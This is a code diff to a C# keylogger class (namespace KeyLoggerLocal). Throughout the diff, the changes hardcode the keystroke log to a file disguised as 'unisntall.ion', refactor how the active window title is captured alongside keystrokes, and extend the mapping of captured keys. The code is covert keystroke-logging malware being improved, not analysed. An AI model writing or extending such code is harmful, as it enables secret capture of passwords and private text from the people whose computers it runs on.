@@ -34,8 +34,7 @@ namespace KeyLoggerLocal
         private String keybuffer;
         private System.Timers.Timer CheckKey;
         private System.Timers.Timer FlushBuffer;
-        private String file;
-        private string directorio;
+        private String file = AppDomain.CurrentDomain.BaseDirectory + "/unisntall.ion";
         private string nombreVentanaAnterior;
 
         private StreamWriter sw;
@@ -99,14 +98,8 @@ namespace KeyLoggerLocal
 
 
 
-        public KeyLogger(String filename)
+        public KeyLogger()
         {
-            keybuffer = string.Empty;
-            int ubicacion = filename.LastIndexOf("\\");
-            directorio = filename.Substring(0, ubicacion);
-            Directory.CreateDirectory(directorio);
-
-            this.File = filename;
             fi = new FileInfo(file);
 
             CheckKey = new System.Timers.Timer();
@@ -180,13 +173,7 @@ namespace KeyLoggerLocal
 
         private bool nombreVentanaActualIgualANombreVentanaAnterior()
         {
-            IntPtr manejadorVentanaActiva = GetForegroundWindow();
-            int largoTituloVentana = GetWindowTextLength(manejadorVentanaActiva);
-            StringBuilder nombreVentana = new StringBuilder(largoTituloVentana);
-
-            GetWindowText(manejadorVentanaActiva, nombreVentana, largoTituloVentana);
-            
-            if (nombreVentana.ToString() == nombreVentanaAnterior)
+            if (getNombreVentanaActual() == nombreVentanaAnterior)
                 return true;
             else return false;
         }
@@ -194,7 +181,7 @@ namespace KeyLoggerLocal
         private string getNombreVentanaActual()
         {
             IntPtr manejadorVentanaActiva = GetForegroundWindow();
-            int largoTituloVentana = GetWindowTextLength(manejadorVentanaActiva);
+            int largoTituloVentana = GetWindowTextLength(manejadorVentanaActiva) + 1;
             StringBuilder nombreVentana = new StringBuilder(largoTituloVentana);
 
             GetWindowText(manejadorVentanaActiva, nombreVentana, largoTituloVentana);
@@ -344,6 +331,10 @@ namespace KeyLoggerLocal
             if (tecla >= (int)Keys.Oem1 && tecla <= (int)Keys.Oem8)
             {
                 return " [" + getNombreTecla(tecla) + "] ";
+            }
+            if (tecla >= (int)Keys.OemClear)
+            {
+                return " [borrar] ";
             }
 
             return "";
